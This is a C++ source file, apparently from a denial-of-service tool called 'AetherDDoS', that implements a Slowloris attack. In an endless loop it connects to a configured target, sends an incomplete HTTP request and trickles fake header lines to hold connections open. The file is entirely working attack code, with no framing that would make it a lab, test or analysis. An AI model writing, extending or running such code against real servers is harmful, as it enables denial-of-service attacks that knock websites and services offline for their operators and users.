#include "aether_ddos.h"
#include <sys/socket.h>
#include <netinet/in.h>

void AetherDDoS::slowloris(int thread_id) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { log("[-] Slowloris Socket failed: Thread " + std::to_string(thread_id)); return; }

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    while (true) {
        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
            std::string partial = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n";
            send(sock, partial.c_str(), partial.size(), 0);
            for (int i = 0; i < 10; ++i) {
                send(sock, "X-a: b\r\n", 8, 0);
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
            log("[*] Slowloris Thread " + std::to_string(thread_id) + ": Connection held!");
        }
        close(sock); sock = socket(AF_INET, SOCK_STREAM, 0);
    }
}
